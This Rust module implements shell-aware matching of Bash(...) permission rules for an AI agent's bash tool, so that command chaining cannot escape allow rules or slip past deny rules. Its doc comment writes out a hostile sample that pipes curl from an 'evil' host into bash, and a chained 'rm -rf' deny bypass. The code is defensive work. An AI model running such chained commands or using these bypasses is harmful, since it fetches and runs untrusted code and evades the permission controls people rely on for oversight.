//! Shell-safety helpers for `Bash(...)` permission-rule matching.
//!
//! Settings permission keys for the bash tool carry the raw command string,
//! and rules such as `Bash(git *)` are matched with plain text globs. Without
//! shell awareness this is unsound in both directions:
//!
//! - allow escape: `Bash(git *)` would match
//!   `git status && curl evil | bash` and run the whole chain unprompted;
//! - deny bypass: `Bash(rm *)` would not match `echo hi && rm -rf x`
//!   because the chain does not start with `rm`.
//!
//! These helpers close the command-chaining class with a small shell-aware
//! scanner. It is not a full Bash parser, but it tracks quotes, comments,
//! redirection operands, and common command prefixes so deny matching does not
//! silently miss executed command words.

/// Shell metacharacters that chain or redirect commands when the string is
/// handed to `bash -c`. Mirrors `ALLOWLIST_BYPASS_METACHARS` in the bash
/// tool's allowlist guard, plus single `&` (backgrounding still chains).
const SHELL_CONTROL_METACHARS: &[&str] = &[
    "&&", "||", ">>", "<<", ";", "|", "&", "$(", "`", ">", "<", "\n", "\r",
];

#[path = "shell_safety_scan.rs"]
mod shell_safety_scan;
use shell_safety_scan::{shell_command_segments, substitution_body_segments};

/// Returns true when the command contains a shell control metacharacter,
/// i.e. it may execute more than the single command named by its prefix.
pub(crate) fn contains_shell_control_metachar(command: &str) -> bool {
    SHELL_CONTROL_METACHARS
        .iter()
        .any(|meta| command.contains(meta))
}

/// Split a `bash -c` command string into candidate command segments for
/// deny-rule matching: the full command plus every chained command,
/// substitution body, and redirection remainder, each with leading
/// environment-variable assignments stripped.
pub(crate) fn command_segments(command: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut push = |segment: &str| {
        for trimmed in normalized_command_segments(segment.trim()) {
            if !trimmed.is_empty() && !segments.contains(&trimmed) {
                segments.push(trimmed);
            }
        }
    };

    push(command);

    let command = remove_escaped_newlines(command);
    push(&command);

    let command_without_heredocs = remove_heredoc_bodies(&command);
    for segment in shell_command_segments(&command_without_heredocs) {
        push(&segment);
    }
    for segment in unquoted_heredoc_substitution_segments(&command) {
        push(&segment);
    }

    segments
}

/// Strip leading `VAR=value` assignments so `FOO=1 rm -rf x` is matched as
/// `rm -rf x`.
fn normalize_command_segment(segment: &str) -> String {
    let mut rest = segment.trim_start();
    loop {
        rest = strip_shell_leading_syntax(rest);
        let Some(value_start) = env_assignment_value_start(rest) else {
            break;
        };
        let consumed = consume_assignment_value(rest, value_start);
        rest = rest[consumed..].trim_start();
    }
    normalize_shell_whitespace(&quote_removed_shell_word(strip_shell_leading_syntax(rest)))
}

fn normalized_command_segments(segment: &str) -> Vec<String> {
    let normalized = normalize_command_segment(segment);
    if normalized.is_empty() {
        return Vec::new();
    }

    let mut segments = vec![normalized.clone()];
    for expanded in brace_expanded_first_word_segments(&normalized) {
        if !expanded.is_empty() && !segments.contains(&expanded) {
            segments.push(expanded);
        }
    }
    segments
}

fn brace_expanded_first_word_segments(segment: &str) -> Vec<String> {
    let Some((word, rest)) = split_first_shell_word(segment) else {
        return Vec::new();
    };
    let Some((prefix, body, suffix)) = split_simple_brace_word(word) else {
        return Vec::new();
    };

    body.split(',')
        .map(|choice| {
            let expanded = format!("{prefix}{choice}{suffix}");
            if rest.is_empty() {
                expanded
            } else {
                format!("{expanded} {rest}")
            }
        })
        .collect()
}

fn split_first_shell_word(segment: &str) -> Option<(&str, &str)> {
    let trimmed = segment.trim_start();
    let end = trimmed.find(char::is_whitespace).unwrap_or(trimmed.len());
    (end > 0).then(|| {
        let rest = trimmed[end..].trim_start();
        (&trimmed[..end], rest)
    })
}

fn split_simple_brace_word(word: &str) -> Option<(&str, &str, &str)> {
    let open = word.find('{')?;
    let close = word[open + 1..].find('}')? + open + 1;
    let body = &word[open + 1..close];
    body.contains(',')
        .then(|| (&word[..open], body, &word[close + 1..]))
}

fn remove_escaped_newlines(command: &str) -> String {
    let mut normalized = String::with_capacity(command.len());
    let mut chars = command.chars().peekable();

    while let Some(c) = chars.next() {
        if c != '\\' {
            normalized.push(c);
            continue;
        }

        match chars.peek().copied() {
            Some('\n') => {
                chars.next();
            }
            Some('\r') => {
                chars.next();
                if matches!(chars.peek(), Some('\n')) {
                    chars.next();
                } else {
                    normalized.push('\\');
                    normalized.push('\r');
                }
            }
            _ => normalized.push(c),
        }
    }

    normalized
}

fn strip_shell_leading_syntax(mut segment: &str) -> &str {
    loop {
        let before_len = segment.len();
        segment = strip_shell_negation_prefix(segment);
        segment = strip_shell_group_prefixes(segment);
        segment = strip_shell_time_prefix(segment);
        segment = strip_shell_command_prefixes(segment);
        segment = strip_shell_reserved_prefixes(segment);
        if segment.len() == before_len {
            return segment;
        }
    }
}

fn strip_shell_negation_prefix(segment: &str) -> &str {
    let segment = segment.trim_start();
    let Some(rest) = segment.strip_prefix('!') else {
        return segment;
    };
    if rest.chars().next().is_none_or(char::is_whitespace) {
        rest.trim_start()
    } else {
        segment
    }
}

fn strip_shell_time_prefix(segment: &str) -> &str {
    let segment = segment.trim_start();
    let Some(rest) = strip_shell_word_prefix(segment, "time") else {
        return segment;
    };
    strip_shell_word_prefix(rest, "-p").unwrap_or(rest)
}

fn strip_shell_command_prefixes(mut segment: &str) -> &str {
    loop {
        segment = segment.trim_start();
        let Some(rest) = ["command", "exec"]
            .iter()
            .find_map(|prefix| strip_shell_word_prefix(segment, prefix))
        else {
            return segment;
        };
        segment = rest;
    }
}

fn strip_shell_group_prefixes(mut segment: &str) -> &str {
    loop {
        segment = segment.trim_start();
        let Some(first) = segment.chars().next() else {
            return segment;
        };
        if !matches!(first, '(' | '{') {
            return segment;
        }
        segment = &segment[first.len_utf8()..];
    }
}

fn strip_shell_reserved_prefixes(mut segment: &str) -> &str {
    const RESERVED_PREFIXES: &[&str] = &[
        "then", "do", "else", "elif", "if", "while", "until", "for", "select", "case",
    ];

    loop {
        segment = segment.trim_start();
        let Some(prefix) = RESERVED_PREFIXES
            .iter()
            .find_map(|prefix| strip_shell_word_prefix(segment, prefix))
        else {
            return segment;
        };
        segment = prefix;
    }
}

fn strip_shell_word_prefix<'a>(segment: &'a str, prefix: &str) -> Option<&'a str> {
    segment
        .strip_prefix(prefix)
        .filter(|rest| rest.chars().next().is_some_and(char::is_whitespace))
        .map(str::trim_start)
}

fn normalize_shell_whitespace(segment: &str) -> String {
    segment.split_whitespace().collect::<Vec<_>>().join(" ")
}

fn env_assignment_value_start(segment: &str) -> Option<usize> {
    let mut seen_name = false;
    for (index, c) in segment.char_indices() {
        if c == '=' {
            return seen_name.then_some(index + c.len_utf8());
        }
        if !(c == '_' || c.is_ascii_alphabetic() || (seen_name && c.is_ascii_digit())) {
            return None;
        }
        seen_name = true;
    }
    None
}

fn consume_assignment_value(segment: &str, value_start: usize) -> usize {
    let Some(first) = segment[value_start..].chars().next() else {
        return value_start;
    };
    match first {
        '\'' | '"' => consume_quoted_value(segment, value_start, first),
        _ => segment[value_start..]
            .find(char::is_whitespace)
            .map(|offset| value_start + offset)
            .unwrap_or(segment.len()),
    }
}

fn consume_quoted_value(segment: &str, value_start: usize, quote: char) -> usize {
    let mut escaped = false;
    let content_start = value_start + quote.len_utf8();
    for (offset, c) in segment[content_start..].char_indices() {
        if quote == '"' && escaped {
            escaped = false;
            continue;
        }
        if quote == '"' && c == '\\' {
            escaped = true;
            continue;
        }
        if c == quote {
            return content_start + offset + c.len_utf8();
        }
    }
    segment.len()
}

fn remove_heredoc_bodies(command: &str) -> String {
    let mut retained = Vec::new();
    let mut pending_delimiters: Vec<HereDocDelimiter> = Vec::new();

    for line in command.split('\n') {
        if let Some(delimiter) = pending_delimiters.first() {
            let candidate = line.trim_end_matches('\r');
            let candidate = if delimiter.strip_tabs {
                candidate.trim_start_matches('\t')
            } else {
                candidate
            };
            if candidate == delimiter.value {
                pending_delimiters.remove(0);
            }
            continue;
        }

        retained.push(line);
        pending_delimiters.extend(find_heredoc_delimiters(line));
    }

    retained.join("\n")
}

fn unquoted_heredoc_substitution_segments(command: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut pending_delimiters: Vec<HereDocDelimiter> = Vec::new();

    for line in command.split('\n') {
        if let Some(delimiter) = pending_delimiters.first() {
            let candidate = line.trim_end_matches('\r');
            let candidate = if delimiter.strip_tabs {
                candidate.trim_start_matches('\t')
            } else {
                candidate
            };
            if candidate == delimiter.value {
                pending_delimiters.remove(0);
                continue;
            }
            if delimiter.expand_body {
                segments.extend(substitution_body_segments(line));
            }
            continue;
        }

        pending_delimiters.extend(find_heredoc_delimiters(line));
    }

    segments
}

fn is_shell_command_separator(input: &str, cursor: usize) -> bool {
    input[cursor..].starts_with("&&")
        || input[cursor..].starts_with("||")
        || input[cursor..].starts_with(';')
        || input[cursor..].starts_with('|')
        || input[cursor..].starts_with('&')
        || input[cursor..].starts_with('{')
        || input[cursor..].starts_with('}')
        || input[cursor..].starts_with(')')
        || input[cursor..].starts_with('\n')
        || input[cursor..].starts_with('\r')
}

fn shell_separator_len(input: &str, cursor: usize) -> usize {
    if input[cursor..].starts_with("&&") || input[cursor..].starts_with("||") {
        2
    } else {
        input[cursor..]
            .chars()
            .next()
            .map(char::len_utf8)
            .unwrap_or(1)
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct HereDocDelimiter {
    value: String,
    strip_tabs: bool,
    expand_body: bool,
}

fn find_heredoc_delimiters(line: &str) -> Vec<HereDocDelimiter> {
    let mut delimiters = Vec::new();
    let mut cursor = 0;
    let mut quote = None;
    let mut escaped = false;

    while cursor < line.len() {
        let Some(c) = line[cursor..].chars().next() else {
            break;
        };

        if escaped {
            escaped = false;
            cursor += c.len_utf8();
            continue;
        }

        if let Some(active_quote) = quote {
            if active_quote == '"' && c == '\\' {
                escaped = true;
            } else if c == active_quote {
                quote = None;
            }
            cursor += c.len_utf8();
            continue;
        }

        if c == '\'' || c == '"' {
            quote = Some(c);
            cursor += c.len_utf8();
            continue;
        }

        if starts_shell_comment(line, cursor) {
            break;
        }

        if !line[cursor..].starts_with("<<") {
            cursor += c.len_utf8();
            continue;
        }

        cursor += 2;
        if line[cursor..].starts_with('<') {
            cursor += 1;
            continue;
        }

        let strip_tabs = line[cursor..].starts_with('-');
        if strip_tabs {
            cursor += 1;
        }
        cursor += line[cursor..]
            .chars()
            .take_while(|c| c.is_whitespace())
            .map(char::len_utf8)
            .sum::<usize>();

        if let Some((delimiter, consumed, quoted)) = read_heredoc_delimiter(&line[cursor..]) {
            delimiters.push(HereDocDelimiter {
                value: delimiter,
                strip_tabs,
                expand_body: !quoted,
            });
            cursor += consumed;
        } else {
            cursor += line[cursor..]
                .chars()
                .next()
                .map(char::len_utf8)
                .unwrap_or(1);
        }
    }
    delimiters
}

fn read_heredoc_delimiter(input: &str) -> Option<(String, usize, bool)> {
    let end = skip_shell_word(input, 0);
    (end > 0).then(|| {
        let word = &input[..end];
        (
            quote_removed_shell_word(word),
            end,
            shell_word_has_quote(word),
        )
    })
}

fn shell_word_has_quote(input: &str) -> bool {
    input.chars().any(|c| matches!(c, '\'' | '"' | '\\'))
}

fn quote_removed_shell_word(input: &str) -> String {
    let mut output = String::new();
    let mut chars = input.chars().peekable();
    let mut quote = None;
    let mut escaped = false;

    while let Some(c) = chars.next() {
        if escaped {
            output.push(c);
            escaped = false;
            continue;
        }

        if let Some(active_quote) = quote {
            if active_quote == '"' && c == '\\' {
                escaped = true;
            } else if c == active_quote {
                quote = None;
            } else {
                output.push(c);
            }
            continue;
        }

        if c == '$' && matches!(chars.peek(), Some('\'')) {
            chars.next();
            quote = Some('\'');
        } else if c == '\'' || c == '"' {
            quote = Some(c);
        } else if c == '\\' {
            escaped = true;
        } else {
            output.push(c);
        }
    }

    output
}

fn skip_shell_word(input: &str, mut cursor: usize) -> usize {
    let mut quote = None;
    let mut escaped = false;

    while cursor < input.len() {
        let Some(c) = input[cursor..].chars().next() else {
            break;
        };

        if escaped {
            escaped = false;
            cursor += c.len_utf8();
            continue;
        }

        if let Some(active_quote) = quote {
            if active_quote == '"' && c == '\\' {
                escaped = true;
            } else if c == active_quote {
                quote = None;
            }
            cursor += c.len_utf8();
            continue;
        }

        if c == '\'' || c == '"' {
            quote = Some(c);
            cursor += c.len_utf8();
            continue;
        }

        if c == '\\' {
            escaped = true;
            cursor += c.len_utf8();
            continue;
        }

        if c.is_whitespace() || matches!(c, ';' | '|' | '&') {
            break;
        }

        cursor += c.len_utf8();
    }

    cursor
}

fn skip_shell_whitespace(input: &str, mut cursor: usize) -> usize {
    while cursor < input.len() {
        let Some(c) = input[cursor..].chars().next() else {
            break;
        };
        if !c.is_whitespace() {
            break;
        }
        cursor += c.len_utf8();
    }
    cursor
}

fn starts_shell_comment(input: &str, cursor: usize) -> bool {
    input[cursor..].starts_with('#')
        && input[..cursor]
            .chars()
            .next_back()
            .is_none_or(|c| c.is_whitespace() || matches!(c, ';' | '&' | '|'))
}

/// True when an allow rule's argument is a partial wildcard pattern such as
/// `git *`. Full-trust patterns (`*` alone) still allow everything: a user
/// who allows every bash command has explicitly opted into chaining.
pub(crate) fn is_partial_wildcard_pattern(pattern_argument: &str) -> bool {
    let trimmed = pattern_argument.trim();
    trimmed.contains('*') && trimmed != "*"
}

#[cfg(test)]
#[path = "shell_safety_tests.rs"]
mod tests;
